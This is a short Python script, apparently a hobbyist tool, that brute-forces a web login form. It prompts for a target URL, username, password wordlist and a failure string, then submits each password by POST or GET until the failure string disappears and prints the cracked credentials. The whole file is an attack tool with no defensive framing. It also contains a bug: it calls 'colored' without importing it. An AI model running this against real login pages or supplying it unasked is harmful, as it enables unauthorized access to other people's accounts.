#!/usr/bin/python3
# Bruteforce v 0.1.0 by @sasanzare 2022/07/19
import requests
import termcolor

#Made by sasan zare
print(termcolor.colored(''' 
    ================================+================================
                    _______  _______  _______  _______
                   (  ____ \(  ___  )/ ___   )(  ___  )
                   | (    \/| (   ) |\/   )  || (   ) |
                   | (_____ | (___) |    /   )| (___) |
                   (_____  )|  ___  |   /   / |  ___  |
                         ) || (   ) |  /   /  | (   ) |
                   /\____) || )   ( | /   (_/\| )   ( |
                   \_______)|/     \|(_______/|/     \|
     Bruteforce
     By: @sasanzare
    ================================+================================
    ''', 'cyan'))

url = input('[+] Please Enter Page URL : ')
username = input('[+] Please Enter Username For The Account To Bruteforce : ')
password_file = input('[+] Please Enter Password File To Use : ')
login_failed_string = input('[+] Please Enter String That Occurs When Login Fails : ')
cookie_value = input('Please Enter Cookie Value(Optional) : ')


def cracking(username,url):
	for password in passwords:
		password = password.strip()
		print(colored(('Trying: ' + password), 'red'))
		data = {'username':username,'password':password,'Login':'submit'}
		if cookie_value != '':
			response = requests.get(url, params={'username':username,'password':password,'Login':'Login'}, cookies = {'Cookie': cookie_value})
		else:
			response = requests.post(url, data=data)
		if login_failed_string in response.content.decode():
			pass
		else:
			print(colored(('[+] Found Username: ==> ' + username), 'green'))
			print(colored(('[+] Found Password: ==> ' + password), 'green'))
			exit()




with open(password_file, 'r') as passwords:
	cracking(username,url)

print('[!!] Password Not In List')


